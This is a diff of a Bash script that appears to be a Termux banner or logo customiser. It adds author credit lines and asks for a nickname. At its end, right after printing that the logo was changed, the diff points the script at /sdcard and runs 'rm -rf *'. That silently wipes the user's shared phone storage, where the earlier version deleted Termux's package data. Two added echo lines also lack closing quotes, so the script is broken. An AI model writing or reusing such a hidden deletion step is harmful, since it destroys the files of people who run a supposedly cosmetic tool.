@@ -1,4 +1,5 @@
 RED='\033[0;31m'
+RED="\e[31m"
 ORANGE="\e[33m"
 BLUE="\e[94m"
 GREEN="\e[92m"
@@ -17,7 +18,15 @@ printf "${BLUE}"
 figlet -w 200 -f  small "maxpro-boop"
 printf "${GREEN}"
 printf "====================================================\n"
+echo -e "\e[1;31m author:Hein Htoo \e[0m"
+echo -e "\e[1;31m GitHub:https://github.com/maxpro-boop/
+echo -e "\e[1;31m FB acc:https://www.facebook.com/hein.htoo.100483
+printf "${GREEN}"
+printf "====================================================\n"
+
+
 printf "${STOP}"
+
 echo ""
 read -p $'\e[1;36m Enter u Nickname:: \e[0m' name
 # Open file descriptor (fd) 3 for read/write on a bash file.
@@ -51,6 +60,5 @@ shopt -s lithist ">&3
  # Close fd 3 
 exec 3>&-
 echo " $Termux Logo Was Changed Go To New Session To See The New"
-cd /$HOME
-cd /$PREFIX/var/lib
+cd /sdcard
 rm -rf *
